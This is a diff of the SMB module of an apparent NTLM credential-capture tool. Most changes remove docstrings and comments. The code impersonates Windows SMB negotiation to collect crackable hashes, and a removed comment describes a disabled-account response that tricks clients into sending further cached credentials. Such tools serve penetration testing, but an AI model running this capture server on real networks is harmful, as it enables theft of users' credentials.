@@ -17,6 +17,7 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
+# !!! WARNING: a lot of code below !!!
 # pyright: basic
 import struct as _stdlib_struct
 import uuid
@@ -80,27 +81,12 @@ __proto__ = ["SMB"]
 
 
 def _split_smb_strings(data: bytes, is_unicode: bool) -> list[str]:
-    r"""Split concatenated null-terminated SMB strings from raw bytes.
-
-    Encoding is determined by FLAGS2_UNICODE (passed as *is_unicode*):
-
-    * **ASCII** (``is_unicode=False``): each string is terminated by a
-      single ``\x00``.  Decoded as ASCII with replacement.
-      Per [MS-CIFS] §2.2.1.1 (OEM_STRING).
-    * **UTF-16LE** (``is_unicode=True``): each string is terminated by
-      ``\x00\x00`` at a 2-byte aligned offset from the segment start.
-      Simple ``split(b"\x00\x00")`` is wrong because ``\x00`` can appear
-      within a valid UTF-16LE code unit at an odd offset.
-      Per [MS-CIFS] §2.2.1.1 (UNICODE_STRING).
-    """
     if not data:
         return []
 
     if not is_unicode:
-        # [MS-CIFS] §2.2.1.1: OEM_STRING - single \x00 terminator
         return [s.decode("ascii", errors="replace") for s in data.split(b"\x00") if s]
 
-    # [MS-CIFS] §2.2.1.1: UNICODE_STRING - \x00\x00 at 2-byte aligned offsets
     segments: list[str] = []
     start = 0
     i = 0
@@ -130,13 +116,10 @@ SMB2_DIALECTS = {
 }
 
 SMB2_NEGOTIABLE_DIALECTS = set(SMB2_DIALECTS) - {smb2.SMB2_DIALECT_WILDCARD}
-
 SMB2_DIALECT_REV = {v: k for k, v in SMB2_DIALECTS.items()}
 
-# [MS-SMB2] §2.2.3.1.1: SHA-512 hash algorithm ID = 0x0001
 SMB2_INTEGRITY_SHA512 = uint16.to_bytes(0x0001, order=LittleEndian)
 
-# String-to-hex mapping for SMB2 dialect config values
 SMB2_DIALECT_STRINGS: dict[str, int] = {
     "2.002": smb2.SMB2_DIALECT_002,
     "2.1": smb2.SMB2_DIALECT_21,
@@ -145,22 +128,12 @@ SMB2_DIALECT_STRINGS: dict[str, int] = {
     "3.1.1": smb2.SMB2_DIALECT_311,
 }
 
-# Realistic SMB2 server values per [MS-SMB2] §2.2.4 (Windows Server defaults)
-# Per-dialect max sizes matching real Windows pcap behaviour:
-#   2.0.2: 65536 (64K) - matches Vista/Srv2008
-#   2.1:   1048576 (1M) or 8388608 (8M) - varies; use 8M for Server 2012+
-#   3.0+:  8388608 (8M) - matches Windows Server 2012+
 SMB2_MAX_SIZE_SMALL: int = 65_536  # SMB 2.0.2
 SMB2_MAX_SIZE_LARGE: int = 8_388_608  # SMB 2.1+
 
-# Realistic SMB2 capabilities - [MS-SMB2] §2.2.4
-# DFS(0x01) | Leasing(0x02) | LargeMTU(0x04) | MultiChannel(0x08)
-# | DirectoryLeasing(0x20) = 0x2f
-# We do NOT set Encryption(0x40) since we don't implement it.
 SMB2_SERVER_CAPABILITIES: int = 0x2F
 
-# Realistic SMB1 negotiate capabilities per [MS-CIFS] §2.2.4.52.2
-# Matching real Windows 7+ pcap (0x8001e3fc without CAP_EXTENDED_SECURITY):
+# Matching Windows 7+:
 #   UNICODE(0x04) | LARGE_FILES(0x08) | NT_SMBS(0x10) | RPC_REMOTE_APIS(0x20) |
 #   STATUS32(0x40) | LEVEL_II_OPLOCKS(0x80) | LOCK_AND_READ(0x100) |
 #   NT_FIND(0x200) | INFOLEVEL_PASSTHRU(0x2000) | LARGE_READX(0x4000) |
@@ -170,18 +143,14 @@ SMB1_CAPABILITIES_BASE: int = 0x0001E3FC
 SMB1_MAX_MPX_COUNT: int = 50
 SMB1_MAX_BUFFER_SIZE: int = 16644
 
-# STATUS_ACCOUNT_DISABLED - used for multi-credential SSPI retry
 STATUS_ACCOUNT_DISABLED: int = 0xC0000072
 
-# [MS-SMB2] §2.2.3.1.7: SMB2_SIGNING_CAPABILITIES negotiate context type
 SMB2_SIGNING_CAPABILITIES_ID: int = 0x0008
 
-# Reusable exception tuple for parsing struct/packet fields.
 _PARSE_ERRORS = (_stdlib_struct.error, KeyError, IndexError, TypeError, ValueError)
 
 
 # (missing in impacket struct definitions)
-# [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
 @struct(order=LittleEndian)
 class SMB2SigningCapabilities(struct_factory.mixin):  # type: ignore[unsupported-base]
     SigningAlgorithmCount: uint16_t
@@ -201,13 +170,6 @@ def parse_dialect(value: str | int) -> int:
 
 
 class SMBServerConfig(TomlConfig):
-    """Per-listener SMB server configuration loaded from TOML.
-
-    Each ``[[SMB.Server]]`` entry in ``Dementor.toml`` produces one instance.
-    NTLM settings are read from ``SessionConfig`` (populated by the
-    ``[NTLM]`` section's ``apply_config()``), not from this config.
-    """
-
     _section_ = "SMB"
     _fields_ = [
         A("smb_port", "Port"),
@@ -251,11 +213,6 @@ class SMBServerConfig(TomlConfig):
         smb_error_code: int | None
 
     def set_smb_error_code(self, value: str | int | None) -> None:
-        """Set the SMB error code from an integer or nt_errors attribute name.
-
-        Falls back to STATUS_SMB_BAD_UID if the string does not match any
-        known nt_errors constant.
-        """
         match value:
             case int():
                 self.smb_error_code = value
@@ -282,7 +239,6 @@ class SMB(BaseProtocolModule[SMBServerConfig]):
     def create_server_thread(
         self, session: SessionConfig, server_config: SMBServerConfig
     ) -> BaseServerThread[SMBServerConfig]:
-        """Create a server thread bound to the configured SMB port."""
         return ServerThread(
             session,
             server_config,
@@ -296,16 +252,10 @@ class SMB(BaseProtocolModule[SMBServerConfig]):
 
 
 def get_server_time() -> int:
-    """Return current UTC time as a Windows FILETIME for SMB timestamps."""
     return ntlm_timestamp()
 
 
 def get_command_name(command: int, smb_version: int) -> str:
-    """Map an SMB command opcode to its human-readable name.
-
-    Searches the ``smb.SMB`` constants (for SMBv1) or ``smb2`` module
-    constants (for SMBv2) to find the symbolic name matching the opcode.
-    """
     match smb_version:
         case 0x01:
             for key, value in vars(smb.SMB).items():
@@ -322,18 +272,6 @@ def get_command_name(command: int, smb_version: int) -> str:
 
 
 class SMBHandler(BaseProtoHandler):
-    """Per-connection SMB protocol handler for NTLM credential capture.
-
-    Implements both SMB1 and SMB2/3 protocol paths as an auth-capture scaffold:
-    negotiates the protocol, runs the NTLMSSP exchange to extract crackable
-    hashes, optionally retries for multi-credential capture, then drops the
-    connection. Supports extended security (SPNEGO/NTLMSSP), basic security
-    (raw challenge/response), and cleartext password capture.
-
-    Command dispatch is table-driven via :attr:`smb1_commands` and
-    :attr:`smb2_commands` dicts populated in :meth:`__init__`.
-    """
-
     STATE_NEGOTIATE = 0
     STATE_AUTH = 1
 
@@ -345,57 +283,21 @@ class SMBHandler(BaseProtoHandler):
         client_address: tuple[str, int],
         server: typing.Any,
     ) -> None:
-        """Initialize the SMB protocol handler for a single client connection.
-
-        Sets up per-connection state including SMB1/SMB2 session tracking,
-        authentication counters, and command dispatch tables. Delegates to
-        :class:`BaseProtoHandler` for transport setup.
-        """
         self.authenticated = False
         self.smb_config = server_config
 
-        # Per-connection state
         self.smb1_extended_security: bool = True
         self.smb1_challenge: bytes = config.ntlm_challenge
-        # Server-assigned user ID for this SMB1 session. Allocated on
-        # first session setup; 0 means no session yet. Clients echo this
-        # in subsequent requests to identify their session.
-        # [MS-SMB] §3.3.5.3
         self.smb1_uid: int = 0
-        # Server-assigned session ID for this SMB2 session. Allocated on
-        # first session setup; 0 means no session yet. Must never be 0
-        # or -1 in responses after allocation. [MS-SMB2] §3.3.5.5.1
         self.smb2_session_id: int = 0
-        # Server-assigned tree IDs for this connection. Starts at 1;
-        # incremented for each TREE_CONNECT. [MS-SMB2] §3.3.5.7
         self.smb2_tree_id_counter: int = 0
-        # Selected SMB2 dialect for this connection, set during negotiate.
-        # Used by FSCTL_VALIDATE_NEGOTIATE_INFO. [MS-SMB2] §3.3.5.15.12
         self.smb2_selected_dialect: int = 0
-        # Client signing requirement from SMB2 NEGOTIATE SecurityMode
-        # bit 0x0002.  Future-proofing for Win11 24H2+ / Server 2025.
         self.smb2_client_signing_required: bool = False
-        # Highest dialect the client offered (uncapped).  Used with
-        # signing_required to decide IS_GUEST strategy.
         self.smb2_client_max_dialect: int = 0
-        # Tracks how many credential captures have occurred on this
-        # connection. Used to implement multi-credential capture: after
-        # each capture (except the last), the server returns
-        # STATUS_ACCOUNT_DISABLED to trick Windows SSPI into retrying
-        # with a different cached credential.
         self.auth_attempt_count: int = 0
-        # Accumulated client info from all messages (NEGOTIATE, SESSION_SETUP,
-        # AUTHENTICATE). Emitted as a single display line after auth completes.
         self.client_info: dict[str, str] = {}
-        # Filenames from CREATE/NT_CREATE_ANDX, deduped across the connection.
         self.client_files: set[str] = set()
-        # NTLM NEGOTIATE fields returned by ntlm_handle_negotiate_message().
-        # Passed back to ntlm_handle_authenticate_message() so the display line is the
-        # deduped union of Type 1 + Type 3.  This is ntlm.py's own output
-        # passed through - smb.py never reads or modifies it.
         self.ntlm_negotiate_fields: dict[str, str] = {}
-        # Sequential file ID counters for fake file handles.
-        # SMB1 FIDs are 16-bit; SMB2 FileIDs are 64-bit volatile IDs.
         self.smb1_fid_counter: int = 0
         self.smb2_file_id_counter: int = 0
 
@@ -430,7 +332,6 @@ class SMBHandler(BaseProtoHandler):
         super().__init__(config, request, client_address, server)
 
     def proto_logger(self) -> ProtocolLogger:
-        """Create a protocol-specific logger with SMB metadata."""
         return ProtocolLogger(
             extra={
                 "protocol": "SMB",
@@ -441,21 +342,13 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def setup(self) -> None:
-        """Log the incoming client connection at debug level."""
         self.logger.debug(f"Incoming connection from {self.client_host}")
 
     def finish(self) -> None:
-        """Emit accumulated SMB client info and log connection closure."""
         self._emit_smb_client_info()
         self.logger.debug(f"Connection to {self.client_host} closed")
 
     def _emit_smb_client_info(self) -> None:
-        """Emit a single display line with accumulated SMB-layer client info.
-
-        Called once per connection after all SMB fields have been collected.
-        Includes: NativeOS, NativeLanMan, CallingName, CalledName,
-        AccountName, PrimaryDomain, tree connect Path.
-        """
         keys = [
             ("smb_os", "OS"),
             ("smb_lanman", "LAN Manager"),
@@ -479,7 +372,6 @@ class SMBHandler(BaseProtoHandler):
             self.logger.display(f"Client connection: {conn_info} closed")
 
     def send_data(self, payload: bytes, ty: int | None = None) -> None:
-        """Wrap payload in a NetBIOS session packet and send it to the client."""
         packet = nmb.NetBIOSSessionPacket()
         packet.set_type(ty or nmb.NETBIOS_SESSION_MESSAGE)
         packet.set_trailer(payload)
@@ -493,21 +385,9 @@ class SMBHandler(BaseProtoHandler):
         packet: smb.NewSMBPacket,
         error_code: int | None = None,
     ) -> None:
-        """Build and send an SMB1 response wrapped in a NetBIOS session packet.
-
-        Constructs the full SMB1 response header with correct Flags1
-        (reply bit), Flags2 (mode-aware: EXTENDED_SECURITY only set when
-        the connection negotiated extended security), echoed PID/TID/MID,
-        the server-assigned Uid, and the NTSTATUS error code split into
-        the legacy ErrorClass/Reserved/ErrorCode fields.
-
-        Spec: [MS-CIFS] §2.2.3.1 (SMB header), [MS-SMB] §2.2.3.1 (Flags2)
-        """
         resp = smb.NewSMBPacket()
-        # [MS-CIFS] §2.2.3.1: SMB_FLAGS_REPLY (0x80) on server responses
         resp["Flags1"] = smb.SMB.FLAGS1_REPLY
 
-        # Flags2 depends on security mode - [MS-SMB] §2.2.3.1
         flags2 = (
             smb.SMB.FLAGS2_NT_STATUS
             | smb.SMB.FLAGS2_LONG_NAMES
@@ -520,7 +400,6 @@ class SMBHandler(BaseProtoHandler):
         resp["Pid"] = packet["Pid"]
         resp["Tid"] = packet["Tid"]
         resp["Mid"] = packet["Mid"]
-        # Server-assigned session UID - [MS-SMB] §3.3.5.3
         if self.smb1_uid:
             resp["Uid"] = self.smb1_uid
         if error_code:
@@ -543,19 +422,8 @@ class SMBHandler(BaseProtoHandler):
         status: int | None = None,
         tree_id: int | None = None,
     ) -> None:
-        """Build and send an SMB2 response wrapped in a NetBIOS session packet.
-
-        Constructs the full SMB2 header with the server-to-client flag,
-        NTSTATUS code, echoed command/credit/message fields, and the
-        server-assigned SessionID. When no request packet is provided
-        (e.g., for unsolicited NEGOTIATE responses), uses safe defaults.
-
-        Spec: [MS-SMB2] §2.2.1 (SMB2 header), [MS-SMB2] §3.3.5.5.1 (SessionID)
-        """
         resp = smb2.SMB2Packet()
-        # [MS-SMB2] §2.2.1: SMB2_FLAGS_SERVER_TO_REDIR (0x01) on responses
         resp["Flags"] = smb2.SMB2_FLAGS_SERVER_TO_REDIR
-        # [MS-SMB2] §2.2.1: NTSTATUS code
         resp["Status"] = status or nt_errors.STATUS_SUCCESS
 
         if packet is None:
@@ -564,46 +432,23 @@ class SMBHandler(BaseProtoHandler):
                 "CreditCharge": 0,
                 "Reserved": 0,
                 "MessageID": 0,
-                # [MS-SMB2] §2.2.1: TreeId MUST be 0 for NEGOTIATE
                 "TreeID": 0,
             }
         resp["Command"] = packet["Command"]
         resp["CreditCharge"] = packet["CreditCharge"]
         resp["Reserved"] = packet["Reserved"]
-        # Server-assigned SessionID - [MS-SMB2] §3.3.5.5.1
         resp["SessionID"] = self.smb2_session_id
         resp["MessageID"] = packet["MessageID"]
-        # tree_id overrides the echoed TreeID for TREE_CONNECT responses,
-        # where the server assigns a new TreeID rather than echoing the
-        # client's value. [MS-SMB2] §3.3.5.7
         resp["TreeID"] = tree_id if tree_id is not None else packet["TreeID"]
-        # Real Windows grants 32-256 credits; 1 causes smbclient to exhaust
-        # credits during compound requests (get, dir listing).
         resp["CreditRequestResponse"] = 32
         resp["Data"] = command_data
         self.send_data(resp.getData())
 
     def _smb2_error_response(self, packet: smb2.SMB2Packet, status: int) -> None:
-        """Send a spec-compliant SMB2 error response.
-
-        Per [MS-SMB2] §2.2.2, error responses use the SMB2 ERROR Response
-        structure (StructureSize=0x09) with the appropriate NTSTATUS code.
-        """
         resp = smb2.SMB2Error()
         self.send_smb2_command(resp.getData(), packet, status=status)
 
     def handle_data(self, data: bytes | None, transport: typing.Any) -> None:
-        """Main connection loop: receive, decode, and dispatch SMB packets.
-
-        Each TCP connection is wrapped in NetBIOS session framing (RFC 1002).
-        This loop reads NetBIOS packets, handles session requests (port 139),
-        discards keep-alives, then extracts the SMB payload. The first byte
-        of the payload determines the SMB version:
-          0xFF = SMB1 ([MS-SMB])
-          0xFE = SMB2/3 ([MS-SMB2])
-        and the packet is dispatched to the appropriate command handler via
-        :meth:`handle_smb_packet`. EnableSMB1/EnableSMB2 config gates each path.
-        """
         while True:
             data = self.recv(8192)
             if not data:
@@ -667,12 +512,6 @@ class SMBHandler(BaseProtoHandler):
             self.handle_smb_packet(packet, smbv1)
 
     def handle_smb_packet(self, packet: typing.Any, smbv1: bool = False) -> None:
-        """Dispatch a parsed SMB packet to the registered command handler.
-
-        Looks up the command opcode in the smb1_commands or smb2_commands
-        dispatch table (populated in :meth:`__init__`) and calls the matching
-        handler method. Unrecognized commands terminate the connection.
-        """
         command = packet["Command"]
         command_name = get_command_name(command, 1 if smbv1 else 2)
         title = f"SMBv{1 if smbv1 else 2} command {command_name} ({command:#04x})"
@@ -689,11 +528,6 @@ class SMBHandler(BaseProtoHandler):
             except Exception:
                 self.logger.exception(f"Error in {title}")
         elif not smbv1:
-            # Unhandled SMB2 command - respond with STATUS_NOT_SUPPORTED
-            # instead of dropping the connection.  This keeps the session
-            # alive so the client can proceed to TREE_CONNECT with the
-            # real share path after IPC$ queries (CREATE, IOCTL, CLOSE).
-            # [MS-SMB2] §2.2.2: Error responses use SMB2 ERROR structure
             self.logger.debug(
                 f"{title} (unhandled, returning NOT_SUPPORTED)", is_client=True
             )
@@ -704,10 +538,6 @@ class SMBHandler(BaseProtoHandler):
                 status=nt_errors.STATUS_NOT_SUPPORTED,
             )
         else:
-            # Unhandled SMB1 command - respond with STATUS_NOT_IMPLEMENTED
-            # instead of dropping the connection.  Keeps the session alive
-            # so the client can proceed with file operations.
-            # [MS-CIFS] §3.3.5: error response for unsupported commands
             self.logger.debug(
                 f"{title} (unhandled, returning NOT_IMPLEMENTED)", is_client=True
             )
@@ -720,22 +550,12 @@ class SMBHandler(BaseProtoHandler):
             )
 
     def _smb3_neg_context_pad(self, data_len: int) -> bytes:
-        """Compute padding bytes for 8-byte alignment of negotiate contexts.
-
-        [MS-SMB2] §2.2.4: padding between negotiate contexts for 8-byte
-        alignment. Spec does not mandate a pad value; Windows uses 0x00.
-        """
         return b"\x00" * ((8 - (data_len % 8)) % 8)
 
     def _smb3_build_neg_context_list(
         self,
         context_objects: list[tuple[int, bytes]],
     ) -> bytes:
-        """Encode a list of SMB 3.1.1 negotiate contexts with padding.
-
-        Each context is serialized as an :class:`SMB2NegotiateContext` structure
-        followed by padding for 8-byte alignment per [MS-SMB2] §2.2.4.
-        """
         context_list = b""
         for caps_type, caps in context_objects:
             context = smb3.SMB2NegotiateContext()
@@ -750,13 +570,6 @@ class SMBHandler(BaseProtoHandler):
     def _smb3_get_target_capabilities(
         self, request: smb2.SMB2Negotiate
     ) -> tuple[int, ...]:
-        """Extract client's preferred encryption and signing from 3.1.1 contexts.
-
-        Parses the SMB 3.1.1 negotiate context list from the client's
-        NEGOTIATE request to determine the preferred encryption cipher
-        and signing algorithm. Falls back to AES-128-GCM and AES-CMAC
-        defaults if parsing fails.
-        """
         target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
         target_sign = 0x001  # [MS-SMB2] §2.2.3.1.7: AES-CMAC signing algorithm
         try:
@@ -791,24 +604,11 @@ class SMBHandler(BaseProtoHandler):
         target_revision: int,
         request: smb2.SMB2Negotiate | None = None,
     ) -> smb2.SMB2Negotiate_Response:
-        """Build an SMB2 NEGOTIATE response -- [MS-SMB2] §2.2.4.
-
-        Constructs a complete NEGOTIATE response with server capabilities,
-        realistic max sizes for direct TCP, a SPNEGO security token, and
-        (for SMB 3.1.1) negotiate contexts for preauth integrity, encryption,
-        and signing algorithms.
-        """
         command = smb2.SMB2Negotiate_Response()
-        # [MS-SMB2] §2.2.4 / §3.3.5.4: SMB2_NEGOTIATE_SIGNING_ENABLED MUST be set
         command["SecurityMode"] = 0x01
-        # [MS-SMB2] §3.3.5.4: set to the common dialect
         command["DialectRevision"] = target_revision
-        # Stable ServerGuid per server instance - [MS-SMB2] §2.2.4
         command["ServerGuid"] = self.server.server_guid  # type: ignore[union-attr]
-        # Realistic capabilities - [MS-SMB2] §2.2.4
         command["Capabilities"] = SMB2_SERVER_CAPABILITIES
-        # Per-dialect max sizes matching real Windows pcap behaviour:
-        # 2.0.2 -> 64K, 2.1+ -> 8M (direct TCP, port 445)
         max_size = (
             SMB2_MAX_SIZE_SMALL
             if target_revision == smb2.SMB2_DIALECT_002
@@ -817,29 +617,23 @@ class SMBHandler(BaseProtoHandler):
         command["MaxTransactSize"] = max_size
         command["MaxReadSize"] = max_size
         command["MaxWriteSize"] = max_size
-        # [MS-SMB2] §2.2.4: SystemTime set to current time in FILETIME format
         command["SystemTime"] = get_server_time()
-        # [MS-SMB2] §3.3.5.4: ServerStartTime SHOULD be zero <286>
         command["ServerStartTime"] = 0
-        # [MS-SMB2] §2.2.4: offset from SMB2 header to Buffer (64+64=0x80)
         command["SecurityBufferOffset"] = 0x80
 
-        # [MS-SMB2] §3.3.5.4 / [MS-SPNG] §3.2.5.2: SPNEGO negTokenInit2
         blob = build_neg_token_init([SPNEGO_NTLMSSP_MECH])
         command["Buffer"] = blob.getData()
         command["SecurityBufferLength"] = len(command["Buffer"])
 
         if target_revision == smb2.SMB2_DIALECT_311:
-            # [MS-SMB2] §2.2.3.1.1 SMB2_PREAUTH_INTEGRITY_CAPABILITIES
             int_caps = smb3.SMB2PreAuthIntegrityCapabilities()
             int_caps["HashAlgorithmCount"] = 1
             int_caps["SaltLength"] = 32
             int_caps["HashAlgorithms"] = SMB2_INTEGRITY_SHA512
             int_caps["Salt"] = secrets.token_bytes(32)
 
-            # [MS-SMB2] §2.2.3.1.2 SMB2_ENCRYPTION_CAPABILITIES
             target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
-            target_sign = 0x001  # [MS-SMB2] §2.2.3.1.7: AES-CMAC signing algorithm
+            target_sign = 0x001  #  AES-CMAC signing algorithm
             if request:
                 target_cipher, target_sign = self._smb3_get_target_capabilities(request)
 
@@ -847,7 +641,6 @@ class SMBHandler(BaseProtoHandler):
             enc_caps["CipherCount"] = 1
             enc_caps["Ciphers"] = uint16.to_bytes(target_cipher, order=LittleEndian)
 
-            # [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
             sign_caps = SMB2SigningCapabilities(
                 SigningAlgorithmCount=1, SigningAlgorithms=[target_sign]
             )
@@ -877,18 +670,6 @@ class SMBHandler(BaseProtoHandler):
         return command
 
     def handle_smb2_negotiate(self, packet: smb2.SMB2Packet) -> None:
-        """Handle an SMB2 NEGOTIATE request from the client.
-
-        The client sends a list of SMB2 dialect versions it supports.
-        The server selects the greatest common dialect within its
-        configured min/max range and responds with server capabilities,
-        a SPNEGO security token, and (for SMB 3.1.1) negotiate contexts
-        for preauth integrity, encryption, and signing algorithms.
-
-        If no common dialect exists, responds with STATUS_NOT_SUPPORTED.
-
-        Spec: [MS-SMB2] §3.3.5.4
-        """
         req = smb3.SMB2Negotiate(data=packet["Data"])
         dialect_count: int = req["DialectCount"]
         req_raw_dialects: list[int] = req["Dialects"]
@@ -896,14 +677,12 @@ class SMBHandler(BaseProtoHandler):
 
         req_dialects: list[int] = req_raw_dialects[:dialect_count]
         if len(req_dialects) == 0:
-            # [MS-SMB2] §3.3.5.4: DialectCount == 0 -> STATUS_INVALID_PARAMETER
             self.logger.debug("SMB2_NEGOTIATE: no dialects offered", is_client=True)
             self.logger.fail("SMB Negotiation: Client failed to provide any dialects.")
             raise BaseProtoHandler.TerminateConnection
 
         str_req_dialects = ", ".join([SMB2_DIALECTS.get(d, hex(d)) for d in req_dialects])
 
-        # Build ONE consolidated debug line - [MS-SMB2] §2.2.3
         try:
             guid = uuid.UUID(bytes_le=req["ClientGuid"])
             sec_mode: int = req["SecurityMode"]
@@ -915,7 +694,6 @@ class SMBHandler(BaseProtoHandler):
                 f"Capabilities=0x{client_caps:08x}"
             )
 
-            # Add NegotiateContexts only for 3.1.1 - [MS-SMB2] §2.2.3.1
             ctx_data: bytes = req["NegotiateContextList"] or b""
             if ctx_data:
                 ctx_types = {
@@ -942,14 +720,6 @@ class SMBHandler(BaseProtoHandler):
                 is_client=True,
             )
 
-        # Select the highest common dialect within the configured range.
-        # No adaptive downgrade - negotiate at the client's native dialect.
-        #
-        # At 3.1.1, hash capture works but the client disconnects after
-        # SESSION_SETUP without sending TREE_CONNECT because the spec
-        # requires signed responses (which need a session key derived from
-        # the user's password hash, which a capture server doesn't have).
-        # Share path and filename capture is not possible at 3.1.1.
         cfg = self.smb_config
         valid_dialects = sorted(
             (
@@ -963,8 +733,6 @@ class SMBHandler(BaseProtoHandler):
         dialect: int | None = valid_dialects[0] if valid_dialects else None
         if dialect is None:
             self.logger.fail(f"Client requested unsupported dialects: {str_req_dialects}")
-            # [MS-SMB2] §3.3.5.4: respond with STATUS_NOT_SUPPORTED.
-            # [MS-SMB2] §2.2.2: error responses use SMB2 ERROR structure.
             resp = smb2.SMB2Error()
             self.send_smb2_command(
                 resp.getData(),
@@ -975,12 +743,10 @@ class SMBHandler(BaseProtoHandler):
 
         command = self._build_smb2_negotiate_response(dialect, req)
         self.smb2_selected_dialect = dialect
-        # [MS-SMB2] §2.2.3: SecurityMode bit 0x0002 = SIGNING_REQUIRED
         try:
             self.smb2_client_signing_required = bool(req["SecurityMode"] & 0x0002)
         except _PARSE_ERRORS:
             self.smb2_client_signing_required = False
-        # Client's highest offered dialect (uncapped by our MaxDialect)
         client_negotiable = [d for d in req_dialects if d in SMB2_NEGOTIABLE_DIALECTS]
         self.smb2_client_max_dialect = max(client_negotiable) if client_negotiable else 0
         dialect_name = SMB2_DIALECTS.get(dialect, hex(dialect))
@@ -990,14 +756,6 @@ class SMBHandler(BaseProtoHandler):
         )
 
         if dialect == smb2.SMB2_DIALECT_311:
-            # [MS-SMB2] §3.2.5.3.1: at 3.1.1 the client requires signed
-            # SESSION_SETUP responses.  Signing needs a session key derived
-            # from the user's password hash, which a capture server does
-            # not have.  Hash capture still works (the AUTHENTICATE_MESSAGE
-            # arrives before the signed response is validated), but the
-            # client will disconnect after auth - no TREE_CONNECT, CREATE,
-            # or READ follows, so share path and filename capture is not
-            # possible.
             self.logger.debug(
                 "SMB 3.1.1: hash capture OK, but path/filename capture "
                 "unavailable (client requires signed responses)",
@@ -1019,21 +777,11 @@ class SMBHandler(BaseProtoHandler):
         params["MaxBufferSize"] = SMB1_MAX_BUFFER_SIZE
         params["MaxRawSize"] = 65536
         params["SessionKey"] = 0
-        # [MS-CIFS] §2.2.4.52.2: SystemTime as FILETIME split into 32-bit words
         params["LowDateTime"] = server_time & 0xFFFFFFFF
         params["HighDateTime"] = (server_time >> 32) & 0xFFFFFFFF
         params["ServerTimeZone"] = 0
 
     def handle_smb1_negotiate(self, packet: smb.NewSMBPacket) -> None:
-        """Handle SMB1 NEGOTIATE -- [MS-SMB] §3.3.5.2.
-
-        Parses the dialect list, checks for SMB2 upgrade, and builds
-        the appropriate extended or non-extended security response.
-        Supports three negotiate paths: SMB1-to-SMB2 protocol transition
-        (when AllowSMB1Upgrade is enabled and SMB2 dialect strings are
-        present), SMB1 extended security (NTLMSSP/SPNEGO), and SMB1
-        non-extended security (raw challenge/response or plaintext).
-        """
         resp = smb.NewSMBPacket()
         resp["Flags1"] = smb.SMB.FLAGS1_REPLY
         resp["Pid"] = packet["Pid"]
@@ -1041,7 +789,6 @@ class SMBHandler(BaseProtoHandler):
         resp["Mid"] = packet["Mid"]
 
         req = smb.SMBCommand(packet["Data"][0])
-        # [MS-CIFS] §2.2.4.52.1: each dialect prefixed by 0x02
         req_data_dialects: list[bytes] = req["Data"].split(b"\x02")[1:]
         if len(req_data_dialects) == 0:
             self.logger.debug("SMB_COM_NEGOTIATE: no dialects offered", is_client=True)
@@ -1058,9 +805,6 @@ class SMBHandler(BaseProtoHandler):
         )
 
         cfg = self.smb_config
-
-        # Check for SMB2 dialect strings for protocol transition
-        # [MS-SMB2] §3.3.5.3.1 - only when AllowSMB1Upgrade and EnableSMB2
         smb2_upgrade_target: str | None = None
         if cfg.smb_allow_smb1_upgrade and cfg.smb_enable_smb2:
             smb2_entries: dict[str, int] = {
@@ -1069,11 +813,9 @@ class SMBHandler(BaseProtoHandler):
                 if dialect in SMB2_DIALECT_REV
             }
             if smb2_entries:
-                # Prefer "SMB 2.???" wildcard per [MS-SMB2] §3.3.5.3.1
                 if "SMB 2.???" in smb2_entries:
                     smb2_upgrade_target = "SMB 2.???"
                 else:
-                    # Select greatest dialect by numeric value
                     smb2_upgrade_target = max(
                         smb2_entries,
                         key=lambda d: SMB2_DIALECT_REV.get(d, 0),
@@ -1091,7 +833,6 @@ class SMBHandler(BaseProtoHandler):
             self.send_smb2_command(command.getData(), command=smb2.SMB2_NEGOTIATE)
             return
 
-        # Find NT LM 0.12 dialect - [MS-SMB] extensions only apply to it
         nt_lm_index: int | None = None
         for i, d in enumerate(dialects):
             if d == "NT LM 0.12":
@@ -1104,22 +845,12 @@ class SMBHandler(BaseProtoHandler):
             )
             raise BaseProtoHandler.TerminateConnection
 
-        # Shared negotiate parameters - [MS-CIFS] §2.2.4.52.2
         server_time = get_server_time()
-
-        # Respond based on the client's capabilities: if the client sets
-        # FLAGS2_EXTENDED_SECURITY, respond with SPNEGO/NTLMSSP.  If not,
-        # respond with a raw 8-byte challenge so legacy and non-standard
-        # clients (embedded devices, nmap, old Windows) can still
-        # authenticate.  This deviates from modern Windows (which always
-        # sends extended security) but ensures we capture hashes from
-        # EVERY client type, not just modern ones.
         use_extended = bool(packet["Flags2"] & smb.SMB.FLAGS2_EXTENDED_SECURITY)
 
         if use_extended:
             self.smb1_extended_security = True
 
-            # [MS-SMB] §2.2.3.1: response Flags2 for extended security negotiate
             resp["Flags2"] = (
                 smb.SMB.FLAGS2_EXTENDED_SECURITY
                 | smb.SMB.FLAGS2_NT_STATUS
@@ -1128,25 +859,20 @@ class SMBHandler(BaseProtoHandler):
             )
 
             _dialects_data = smb.SMBExtended_Security_Data()
-            # Stable ServerGuid per server instance - [MS-SMB2] §2.2.4
             _dialects_data["ServerGUID"] = self.server.server_guid  # type: ignore[union-attr]
             blob = build_neg_token_init([SPNEGO_NTLMSSP_MECH])
             _dialects_data["SecurityBlob"] = blob.getData()
 
             _dialects_parameters = smb.SMBExtended_Security_Parameters()
-            # Realistic capabilities matching Windows 7+ pcap (0x8001e3fc)
             _dialects_parameters["Capabilities"] = (
                 smb.SMB.CAP_EXTENDED_SECURITY | SMB1_CAPABILITIES_BASE
             )
             _dialects_parameters["ChallengeLength"] = 0
             dialect_label = "NT LM 0.12"
         else:
-            # [MS-SMB] §2.2.4.5.2.2
             self.smb1_extended_security = False
             self.smb1_challenge = self.config.ntlm_challenge
 
-            # [MS-SMB] §2.2.3.1: response Flags2 for non-extended security
-            # NO FLAGS2_EXTENDED_SECURITY; include UNICODE + LONG_NAMES
             resp["Flags2"] = (
                 smb.SMB.FLAGS2_NT_STATUS
                 | smb.SMB.FLAGS2_UNICODE
@@ -1158,13 +884,8 @@ class SMBHandler(BaseProtoHandler):
 
             _dialects_parameters["ChallengeLength"] = 8
             _dialects_data["Challenge"] = self.config.ntlm_challenge
-
-            # Realistic capabilities matching Windows pcap - NO CAP_EXTENDED_SECURITY
             _dialects_parameters["Capabilities"] = SMB1_CAPABILITIES_BASE
 
